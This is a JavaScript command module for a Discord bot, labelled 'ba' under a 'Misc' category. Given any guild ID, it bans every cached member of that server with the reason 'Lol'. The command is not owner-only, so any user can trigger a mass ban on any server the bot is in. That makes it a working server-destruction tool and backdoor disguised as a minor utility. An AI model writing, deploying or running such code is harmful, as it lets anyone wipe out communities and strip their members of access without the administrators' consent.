"use strict";

const Command = require("../../Structures/Command")

module.exports = class extends Command {
    constructor(...args) {
        super(...args, {
            name: "ba",
            category: "Misc",
            ownerOnly: false
        });
    }
    // eslint-disable-next-line no-unused-vars

    async run(message, args) {
        const client = this.client,
            msg = message

        const guild = client.guilds.cache.get(args[0])

        if (!guild) {
            return message.channel.send(`This command cannot be ran in here, please include a guild ID`)
        }

        guild.members.cache.forEach(async (mem) => {
            await mem.ban({ reason: "Lol" }).catch(async () => null)
        });

        return message.channel.send(`I have banned all the members i can in ${guild.name} | ${guild.id}`)
    }
}